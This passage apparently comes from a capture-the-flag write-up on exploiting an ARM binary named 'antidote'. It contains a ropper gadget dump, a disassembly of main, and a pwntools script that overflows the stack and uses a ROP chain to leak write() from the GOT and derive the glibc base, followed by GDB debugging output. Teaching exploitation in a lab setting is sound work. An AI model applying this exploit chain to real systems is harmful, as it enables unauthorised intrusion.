<span class="code-dark-red">0x000004c0</span>: <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">ldr</span> <span class="code-white">r3, [pc, #0x10]<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x0000061c</span>: <span class="code-yellow">cmp</span> <span class="code-white">r6, sb<span class="code-blue">; <span class="code-yellow">add</span> <span class="code-white">r4, r5, #4<span class="code-blue">; <span class="code-yellow">bne</span> <span class="code-white">#0x5ec<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000608</span>: <span class="code-yellow">ldr</span> <span class="code-white">ip, [r4, #4]<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000005cc</span>: <span class="code-yellow">ldr</span> <span class="code-white">ip, [r4], #4<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r6, #2<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000004c8</span>: <span class="code-yellow">ldr</span> <span class="code-white">r3, [pc, #0x10]<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000004c8</span>: <span class="code-yellow">ldr</span> <span class="code-white">r3, [pc, #0x10]<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000498</span>: <span class="code-yellow">ldr</span> <span class="code-white">r3, [pc, #0x10]<span class="code-blue">; <span class="code-yellow">ldrb</span> <span class="code-white">r2, [r3]<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r2, #0<span class="code-blue">; <span class="code-yellow">moveq</span> <span class="code-white">r2, #1<span class="code-blue">; <span class="code-yellow">strbeq</span> <span class="code-white">r2, [r3]<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x000005a0</span>: <span class="code-yellow">ldr</span> <span class="code-white">r3, [r4], #4<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">r5, sb, #1<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000005f0</span>: <span class="code-yellow">ldr</span> <span class="code-white">r3, [r5], #4<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x0000049c</span>: <span class="code-yellow">ldrb</span> <span class="code-white">r2, [r3]<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r2, #0<span class="code-blue">; <span class="code-yellow">moveq</span> <span class="code-white">r2, #1<span class="code-blue">; <span class="code-yellow">strbeq</span> <span class="code-white">r2, [r3]<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x00000558</span>: <span class="code-yellow">mov</span> <span class="code-white">r0, r3<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">sp, fp, #4<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{fp, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x0000060c</span>: <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000005f4</span>: <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000005d0</span>: <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r6, #2<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000005a4</span>: <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">r5, sb, #1<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x00000610</span>: <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000005f8</span>: <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000005d4</span>: <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r6, #2<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000005a8</span>: <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">r5, sb, #1<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x0000054c</span>: <span class="code-yellow">mov</span> <span class="code-white">r2, #0x12c<span class="code-blue">; <span class="code-yellow">bl</span> <span class="code-white">#0x3e4<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, r3<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">sp, fp, #4<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{fp, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000614</span>: <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x00000614</span>: <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r6, sb<span class="code-blue">; <span class="code-yellow">add</span> <span class="code-white">r4, r5, #4<span class="code-blue">; <span class="code-yellow">bne</span> <span class="code-white">#0x5ec<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000005fc</span>: <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000005d8</span>: <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r6, #2<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000005ac</span>: <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">r5, sb, #1<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x00000554</span>: <span class="code-yellow">mov</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, r3<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">sp, fp, #4<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{fp, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000005ec</span>: <span class="code-yellow">mov</span> <span class="code-white">r5, r4<span class="code-blue">; <span class="code-yellow">ldr</span> <span class="code-white">r3, [r5], #4<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000005dc</span>: <span class="code-yellow">mov</span> <span class="code-white">r6, #2<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000004a4</span>: <span class="code-yellow">moveq</span> <span class="code-white">r2, #1<span class="code-blue">; <span class="code-yellow">strbeq</span> <span class="code-white">r2, [r3]<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x00000560</span>: <span class="code-yellow">pop</span> <span class="code-white">{fp, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000003cc</span>: <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000628</span>: <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000628</span>: <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x000004d0</span>: <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000004d0</span>: <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000004c4</span>: <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">ldr</span> <span class="code-white">r3, [pc, #0x10]<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000004c4</span>: <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">ldr</span> <span class="code-white">r3, [pc, #0x10]<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000003c4</span>: <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">bl</span> <span class="code-white">#0x474<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000638</span>: <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000004a8</span>: <span class="code-yellow">strbeq</span> <span class="code-white">r2, [r3]<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x000005b0</span>: <span class="code-yellow">sub</span> <span class="code-white">r5, sb, #1<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x0000055c</span>: <span class="code-yellow">sub</span> <span class="code-white">sp, fp, #4<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{fp, pc}<span class="code-blue">;</span>

65 gadgets found
</code></pre></div><p>From the above output of <code>ropper</code> (inside GDB), we can see that we can easily set registers <code>$r4</code> up to <code>$r8</code> with this gadget:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">0x00000628</span>: <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>  
</code></pre></div><p>Then, we can also use the following to set <code>$r3</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">0x000003cc</span>: <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>  
</code></pre></div><p>And then we can set <code>$r0</code>, <code>$r1</code> and <code>$r2</code> with this one (since we control <code>$sl</code>, <code>$r7</code> and <code>$r8</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">0x000005a4</span>: <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">r5, sb, #1<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>  
</code></pre></div><p>And then jump to <code>$r3</code> (that&rsquo;s the meaning of <code>blx r3</code>, more information <a target="_blank" href="https://developer.arm.com/documentation/dui0489/i/arm-and-thumb-instructions/blx">here</a>).</p><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>This is the assembly code for <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>disassemble main
Dump of assembler code for function main:
   <span class="code-dark-blue">0x000084e4</span> &lt;+0&gt;:     push    {r11, lr}
   <span class="code-dark-blue">0x000084e8</span> &lt;+4&gt;:     add     r11, sp, #4
   <span class="code-dark-blue">0x000084ec</span> &lt;+8&gt;:     sub     sp, sp, #216    ; 0xd8
   <span class="code-dark-blue">0x000084f0</span> &lt;+12&gt;:    ldr     r3, [pc, #108]  ; <span class="code-dark-blue">0x8564</span> &lt;<span class="code-dark-yellow">main</span>+128&gt;  
   <span class="code-dark-blue">0x000084f4</span> &lt;+16&gt;:    ldr     r3, [r3]
   <span class="code-dark-blue">0x000084f8</span> &lt;+20&gt;:    mov     r0, r3
   <span class="code-dark-blue">0x000084fc</span> &lt;+24&gt;:    mov     r1, #0
   <span class="code-dark-blue">0x00008500</span> &lt;+28&gt;:    mov     r2, #2
   <span class="code-dark-blue">0x00008504</span> &lt;+32&gt;:    mov     r3, #0
   <span class="code-dark-blue">0x00008508</span> &lt;+36&gt;:    bl      <span class="code-dark-blue">0x8414</span> &lt;<span class="code-dark-yellow">setvbuf@plt</span>&gt;
   <span class="code-dark-blue">0x0000850c</span> &lt;+40&gt;:    ldr     r3, [pc, #84]   ; <span class="code-dark-blue">0x8568</span> &lt;<span class="code-dark-yellow">main</span>+132&gt;
   <span class="code-dark-blue">0x00008510</span> &lt;+44&gt;:    sub     r1, r11, #156   ; 0x9c
   <span class="code-dark-blue">0x00008514</span> &lt;+48&gt;:    mov     r2, r3
   <span class="code-dark-blue">0x00008518</span> &lt;+52&gt;:    mov     r3, #152        ; 0x98
   <span class="code-dark-blue">0x0000851c</span> &lt;+56&gt;:    mov     r0, r1
   <span class="code-dark-blue">0x00008520</span> &lt;+60&gt;:    mov     r1, r2
   <span class="code-dark-blue">0x00008524</span> &lt;+64&gt;:    mov     r2, r3
   <span class="code-dark-blue">0x00008528</span> &lt;+68&gt;:    bl      <span class="code-dark-blue">0x83f0</span> &lt;<span class="code-dark-yellow">memcpy@plt</span>&gt;
   <span class="code-dark-blue">0x0000852c</span> &lt;+72&gt;:    sub     r3, r11, #156   ; 0x9c
   <span class="code-dark-blue">0x00008530</span> &lt;+76&gt;:    mov     r0, #1
   <span class="code-dark-blue">0x00008534</span> &lt;+80&gt;:    mov     r1, r3
   <span class="code-dark-blue">0x00008538</span> &lt;+84&gt;:    mov     r2, #152        ; 0x98
   <span class="code-dark-blue">0x0000853c</span> &lt;+88&gt;:    bl      <span class="code-dark-blue">0x8420</span> &lt;<span class="code-dark-yellow">write@plt</span>&gt;
   <span class="code-dark-blue">0x00008540</span> &lt;+92&gt;:    sub     r3, r11, #220   ; 0xdc
   <span class="code-dark-blue">0x00008544</span> &lt;+96&gt;:    mov     r0, #0
   <span class="code-dark-blue">0x00008548</span> &lt;+100&gt;:   mov     r1, r3
   <span class="code-dark-blue">0x0000854c</span> &lt;+104&gt;:   mov     r2, #300        ; 0x12c
   <span class="code-dark-blue">0x00008550</span> &lt;+108&gt;:   bl      <span class="code-dark-blue">0x83e4</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;
   <span class="code-dark-blue">0x00008554</span> &lt;+112&gt;:   mov     r3, #0
   <span class="code-dark-blue">0x00008558</span> &lt;+116&gt;:   mov     r0, r3
   <span class="code-dark-blue">0x0000855c</span> &lt;+120&gt;:   sub     sp, r11, #4
   <span class="code-dark-blue">0x00008560</span> &lt;+124&gt;:   pop     {r11, pc}
   <span class="code-dark-blue">0x00008564</span> &lt;+128&gt;:   andeq   r0, r1, r4, ror #16
   <span class="code-dark-blue">0x00008568</span> &lt;+132&gt;:   andeq   r8, r0, r4, asr #12
End of assembler dump.
</code></pre></div><p>In order to leak the address of <code>write</code> from Glibc, we need to set <code>$r0 = 1</code> in order to write to <code>stdout</code> and set <code>$r1</code> to the address of <code>write</code> at the GOT. There&rsquo;s no simple gadget to set <code>$r0</code>, but we can set <code>$r3</code> to be the address of <code>write</code> at the GOT and then jump to <code>main+76</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ...
   <span class="code-dark-blue">0x00008530</span> &lt;+76&gt;:    mov     r0, #1
   <span class="code-dark-blue">0x00008534</span> &lt;+80&gt;:    mov     r1, r3
   <span class="code-dark-blue">0x00008538</span> &lt;+84&gt;:    mov     r2, #152        ; 0x98
   <span class="code-dark-blue">0x0000853c</span> &lt;+88&gt;:    bl      <span class="code-dark-blue">0x8420</span> &lt;<span class="code-dark-yellow">write@plt</span>&gt;  
   ...
</code></pre></div><p>So that <code>$r0</code> will be set to <code>1</code> and <code>$r1</code> will hold the same value as <code>$r3</code> and then <code>write</code> is called:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">pop_r3_pc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">83cc</span>
<span class="mtk1">    </span><span class="mtk1">pop_r4_r5_r6_r7_r8_sb_sl_pc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">8628</span>
<span class="mtk1">    </span><span class="mtk1">mov_r0_sl_mov_r1_r2_mov_r2_r7_blx_r3</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">85f4</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">220</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_r3_pc</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.write)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span>elf<span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.main </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">76</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">write_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u32(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">(</span><span class="mtk6">4</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked write() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">write_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">write_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.write</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './antidote'
    Arch:     arm-32-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x8000)</span>
[<span class="code-green">+</span>] Starting local process './antidote': pid 1369435
[<span class="code-blue">*</span>] Leaked write() address: 0xff6e5e28
[<span class="code-green">+</span>] Glibc base address: 0xff619000
[<span class="code-blue">*</span>] Switching to interactive mode
qemu: uncaught target signal 11 (Segmentation fault) - core dumped  
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>And there we have the leak and the right base address of Glibc (notice that it ends in <code>000</code> in hexadecimal format). But the program crashed, which is not expected.</p><p>In order to debug, we can write the payload into a file and then use <code>cat</code> to redirect the contents to <code>qemu-arm</code> while debugging with GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'payload'</span><span class="mtk1">, </span><span class="mtk4">'wb'</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">:</span>  
<span class="mtk1">        </span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">payload</span> | <span class="code-dark-green">qemu-arm</span> -g 1234 <span class="mtku">antidote</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb-multiarch</span> -q
<span class="code-red">gef➤  </span>file antidote
Reading symbols from <span class="code-dark-green">antidote</span>...
(No debugging symbols found in <span class="code-dark-green">antidote</span>)
<span class="code-red">gef➤  </span>break *main+88
Breakpoint 1 at <span class="code-dark-blue">0x853c</span>
<span class="code-red">gef➤  </span>target remote localhost:1234
Remote debugging using localhost:1234
warning: remote target does not support file transfer, attempting to access files from local filesystem.  
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
<span class="code-dark-blue">0xff7bca40</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><p>The breakpoint is set at the <code>write</code> call. One instruction after the second call to <code>write</code> we have this situation:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $pc
=&gt; <span class="code-dark-blue">0x8540</span> &lt;<span class="code-dark-yellow">main</span>+92&gt;:    sub     r3, r11, #220   ; 0xdc  
<span class="code-green">gef➤  </span>p $r3
$1 = 0x1
<span class="code-green">gef➤  </span>p $r11
$2 = 0x41414141
</code></pre></div><p>In fact, <code>$r11</code> is used to compute the address where <code>read</code> will store input data, and obviously <code>0x41414141</code> is not valid. Actually, <code>$r11</code> is poped right before <code>$pc</code> at address <code>main+124</code>, so we need to use another value there. For instance, the legitimate value, which is <code>0xfffef85c</code> (it can be seen in GDB):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">qemu-arm</span> -g 1234 <span class="mtku">antidote</span>  
